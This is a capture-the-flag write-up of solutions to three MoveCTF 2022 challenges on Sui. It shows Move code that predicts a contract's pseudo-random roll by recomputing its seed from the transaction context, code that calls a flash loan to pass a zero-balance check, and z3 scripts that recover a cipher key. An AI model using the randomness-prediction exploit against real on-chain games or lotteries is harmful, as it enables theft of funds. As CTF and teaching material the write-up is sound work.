# sui-move-ctf

This is the solution for movectf 2022.
The writeup: https://medium.com/amber-group/movectf-2022-writeup-5a2d0a1c1a2d 

# Simple Game

## Get the box

Although we'll crack the random number later, we can simply get the a treasury box by `slay_boar`, `level_up`, and `slay_boar_king` within the `200` stamina. So, we started from sending lots of txs out in a script. However, since the rpc was not stable, we can do it in a function like this and get the box in one-shot.

```rust
    public entry fun get_box(hero: &mut Hero, ctx: &mut TxContext) {
        while (hero::experience(hero) < 100) {
            adventure::slay_boar(hero, ctx);
        };

        hero::level_up(hero);

        while (hero::stamina(hero) >= 2) {
            adventure::slay_boar_king(hero, ctx);
        };
    }
```

## Crack the random number

Now, you have a treasury box. Will you just give a try invoking `get_flag`? I did and my lovely box gone. If you read through the `get_flag()` implementation, you'll see that you can only get one flag with more than 100 boxes. For sure, you can try it but I don't think it's the right way to go.

```rust
    public entry fun get_flag(box: TreasuryBox, ctx: &mut TxContext) {
        let TreasuryBox { id } = box;
        object::delete(id);
        let d100 = random::rand_u64_range(0, 100, ctx);        
        if (d100 == 0) {
            event::emit(Flag { user: tx_context::sender(ctx), flag: true });
        }
    }

```

This remind me the psudo-random problem happens in the Ethereum back in 2018. We can probably generate a `d100` in our own smart contract and invoke `get_flag` if and only if `d100 == 0`. This theory seems work as the `ctx` is the only thing that affects the seed.

```rust
    /// Generate a random integer range in [low, high).
    public fun rand_u64_range(low: u64, high: u64, ctx: &mut TxContext): u64 {
        rand_u64_range_with_seed(seed(ctx), low, high)
    }
```

However, it's not that easy. We tested two consecutive `random::rand_u64_range(0, 100, ctx)` calls in the same tx. We got two different random numbers. How come?

## seed

The `random::seed()` function actually generates a seed by hashing the content of `ctx` and the `uid` created by `object::new(ctx)` as shown in the code snippet below:

```rust
    fun seed(ctx: &mut TxContext): vector<u8> {
        let ctx_bytes = bcs::to_bytes(ctx);
        let uid = object::new(ctx);
        let uid_bytes: vector<u8> = object::uid_to_bytes(&uid);
        object::delete(uid);

        let info: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut info, ctx_bytes);
        vector::append<u8>(&mut info, uid_bytes);

        let hash: vector<u8> = hash::sha3_256(info);
        hash
    }
```

It seems we can compute the same seed in our own function. But, the `uid` is an `u64` number which increments in each `object::new(ctx)` call. 

```rust
    public fun new(ctx: &mut TxContext): UID {
        UID {
            id: ID { bytes: tx_context::new_object(ctx) },
        }
    }
```

Specifically, if you check `object.move` and `tx_context.move` in the Sui framework. You'll find out that the `ctx.ids_created` number would be used to generate the `uid` and that number would be incremented by one before the `object::new(ctx)` call is done.

```rust
    public(friend) fun new_object(ctx: &mut TxContext): address {
        let ids_created = ctx.ids_created;
        let id = derive_id(*&ctx.tx_hash, ids_created);
        ctx.ids_created = ids_created + 1;
        id
    }
```

So, we need to do the `new_object()` thing locally without adding `ids_created` by one so that we can predict the next random number and let the `get_flag()` call generate the same random number out. However, we can't simply copy-paste the above code into our own module since all members defined in the `TxContext` structure can only accessed in the `tx_context` module.

```rust
    struct TxContext has drop {
        /// A `signer` wrapping the address of the user that signed the current transaction
        signer: signer,
        /// Hash of the current transaction
        tx_hash: vector<u8>,
        /// The current epoch number.
        epoch: u64,
        /// Counter recording the number of fresh id's created while executing
        /// this transaction. Always 0 at the start of a transaction
        ids_created: u64
    }
```

## BCS

While reading through the Sui framework codebase and the random module, we noticed that there's a `sui::bcs` module which can be used to serialized and deserialized all format of data. So, we gave it a try.

```rust
    fun my_new_object(ids_created: u64, ctx: &mut TxContext): vector<u8> {
        let ctx_bytes = bcs::to_bytes(ctx);
        let prepared: BCS = bcs::new(ctx_bytes);
        let (_, tx_hash) = (
            bcs::peel_address(&mut prepared), 
            bcs::peel_vec_u8(&mut prepared),
        );
        let id = derive_id(tx_hash, ids_created);
        id
    }
```

See our version of `new_object()` above. We simply serilalize `ctx` into `ctx_bytes` and retrive the `tx_hash` out with `peel_vec_u8()`.

## derive_id

Now, we can do `object::new_object()` on our own except the `derive_id()` native function. At some time, we thought we can simply declare that native function in our own module and invoke it in the same way as the `tx_context` module.

```rust
    /// Native function for deriving an ID via hash(tx_hash || ids_created)
    native fun derive_id(tx_hash: vector<u8>, ids_created: u64): address;
```

However, that's not the case. And, this is the hardest part of this *simple* challenge.

### hash function

As we see the comments came with the declaration of the native function, we should do `hash(tx_hash || ids_created)` in our own module. But, what hash function should we use?

Again, we searched the sui codebase and found the `derive_id()` implementation in `crates/sui-types/src/base_types.rs`:

```rust
    /// Create an ObjectID from `self` and `creation_num`.
    /// Caller is responsible for ensuring that `creation_num` is fresh
    pub fn derive_id(&self, creation_num: u64) -> ObjectID {
        // TODO(https://github.com/MystenLabs/sui/issues/58):audit ID derivation

        let mut hasher = Sha3_256::default();
        hasher.update(self.0);
        hasher.update(creation_num.to_le_bytes());
        let hash = hasher.finalize();

        // truncate into an ObjectID.
        ObjectID::try_from(&hash[0..ObjectID::LENGTH]).unwrap()
    }
```

So, `sha3_256()` in `std::hash` below seems the one we should use in our own module.

```rust
module std::hash {
    native public fun sha2_256(data: vector<u8>): vector<u8>;
    native public fun sha3_256(data: vector<u8>): vector<u8>;
}
```

### to_le_bytes and ObjectID::LENGTH

Now, we know that we should pack `tx_hash` and `ids_created` into a `vector<u8>` and invoke `sha3_256()` to get the hash we want. However, that's not the case again. After couple hours of debugging, we noticed that the rust function `to_le_bytes(ids_created)` should be done this way:

```rust
vector[(ids_created as u8), 0, 0, 0, 0, 0, 0, 0]
```

And, we should drop the last 16 bytes of the hash to truncate the hash into the ObjectID.

```rust
    fun derive_id(tx_hash: vector<u8>, ids_created: u64): vector<u8> {
        let info: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut info, tx_hash);
        vector::append<u8>(&mut info, vector[(ids_created as u8), 0, 0, 0, 0, 0, 0, 0]);
        let hash: vector<u8> = hash::sha3_256(info);
        let length = vector::length(&mut hash);
        while ( length > 20 ) {
            vector::remove(&mut hash, length-1);
            length = length - 1;
        };
        hash
    }
```

# Flash Loan

Since the `get_flag()` function checks if the current balance is zero, we just need to `loan()` all 1000 coins and `get_flag()`. However, both `loan` and `receipt` do not have the `drop` crate. We need to consume them with `repay()` and `check()`.

```rust
    public entry fun solve(flash_lender: &mut FlashLender, ctx: &mut TxContext) {
        let (loan, receipt) = flash::loan(flash_lender, 1000, ctx);
        flash::get_flag(flash_lender, ctx);
        flash::repay(flash_lender, loan);
        flash::check(flash_lender, receipt);
    }
```

# Move Lock

We use [z3 solver](https://pypi.org/project/z3-solver/) to find the solution.

## Solution 1

The `% 26` thing is kind of confusing. All we do is using another variable `u` to present it this way:

```rust
            let c11 = ( (a11 * p11) + (a12 * p21) + (a13 * p31) ) % 26;
            => (a11 * p11) + (a12 * p21) + (a13 * p31) == 26*u + c11
```

## Solution 2

Two valid vectors `data1` and `data2` are required to solve the challenge. `data1` is a part of the `complete_plaintext`. `data2` is the encryption key. `complete_plaintext` and `data2` are fed into a linear algebra equation. The results are compared with `encrypted_flag`.

Since part of the `complete_plaintext` is given, we can use z3 to find a solution of `data2`. We limited the elements of `data2` to range 0-26 to reduce the search space of z3.

```
key = [ Int('key_'+str(i))   for i in range(3*3) ]
a11, a12, a13 = key[0:3]
a21, a22, a23 = key[3:6]
a31, a32, a33 = key[6:9]

s = Solver()
for k in key:
    s.add(And(k >= 0, k < 26))
for i in range(0, 9, 3):
    p11,p21,p31 = complete_plaintext[i:i+3]
    c11 = ( (a11 * p11) + (a12 * p21) + (a13 * p31) ) % 26
    c21 = ( (a21 * p11) + (a22 * p21) + (a23 * p31) ) % 26
    c31 = ( (a31 * p11) + (a32 * p21) + (a33 * p31) ) % 26

    s.add(And(c11 == ciphertext[i], c21 == ciphertext[i+1], c31 == ciphertext[i+2]))
s.check()

m = s.model()
```

Then we can solve `data1` with `data2`(`key`) and `encrypted_flag`.

```
key = [25, 11, 6, 10, 13, 25, 12, 19, 2]
a11, a12, a13 = key[0:3]
a21, a22, a23 = key[3:6]
a31, a32, a33 = key[6:9]

data1 = []
for i in range(9, len(complete_plaintext), 3):
    s = Solver()

    p11,p21,p31 = complete_plaintext[i:i+3]
    s.add(And(p11 >= 0, p21 >= 0, p31 >= 0))
    c11 = ( (a11 * p11) + (a12 * p21) + (a13 * p31) ) % 26
    c21 = ( (a21 * p11) + (a22 * p21) + (a23 * p31) ) % 26
    c31 = ( (a31 * p11) + (a32 * p21) + (a33 * p31) ) % 26

    s.add(And(c11 == ciphertext[i], c21 == ciphertext[i+1], c31 == ciphertext[i+2]))
    s.check()
    m = s.model()
    data1 += [m.eval(p11), m.eval(p21), m.eval(p31)]

print(data1)
```
